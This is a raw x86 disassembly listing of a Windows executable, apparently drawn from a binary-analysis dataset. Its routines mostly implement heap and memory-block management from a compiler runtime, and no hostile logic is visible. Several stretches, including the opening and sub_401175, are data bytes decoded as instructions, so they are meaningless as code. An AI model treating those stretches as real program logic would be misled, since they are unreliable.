sub_401098
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x59500040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] bl
add al cl
xor eax [ eax ]
mov esp 0x6c004033
pop ecx
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
xchg esp eax
mov eax [ 0xffffffffc08b0048 ]
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] al
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
pop es
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403220
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x59500040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x40 ] bl
add al cl
xor eax [ eax ]
mov esp 0x6c004033
pop ecx
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
xchg esp eax
mov eax [ 0xffffffffc08b0048 ]
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401390
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401350
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401390
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401430
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401418
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013e8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013e8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401534
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401368
xor eax eax
mov [ ebx ] eax
sub_401598
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401360
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401360
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013e8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401368
xor eax eax
mov [ ebx ] eax
sub_401610
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401368
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401418
mov [ rw-data ] 0x1
sub_4016c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401360
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40175c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401368
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401534
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016c8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401430
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401610
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401418
jmp r-xdata
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401598
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401430
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016c8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401610
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401418
jmp r-xdata
sub_401990
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40175c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401610
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014a0
jmp r-xdata
sub_401a1c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ad2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401370
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
push 0xff8
push 0x0
call sub_401350
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401378
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ad9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401380
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ae0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bb6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401378
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401368
mov ebx [ ebx ]
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax rw-data
call sub_4013e0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401388
retn
push rw-data
call sub_401380
sub_401bc0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c24
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c54
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e28
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401ca8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c84
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cd0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bc0
add ebx esi
mov [ rw-data ] 0x6
sub_401d40
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bc0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c24
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401990
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401990
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c54
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014a0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401ca8
sub_401e28
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d78
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401eb0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c84
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401efc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401eb0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401430
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cd0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d40
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c54
sub [ edi + 0x4 ] 0x4
sub_401f88
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017dc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fb4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401efc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fe8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402014
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bc0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e28
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f88
test al al
jne r-xdata
mov eax esi
call sub_401fe8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402108
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a1c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402284
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401378
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
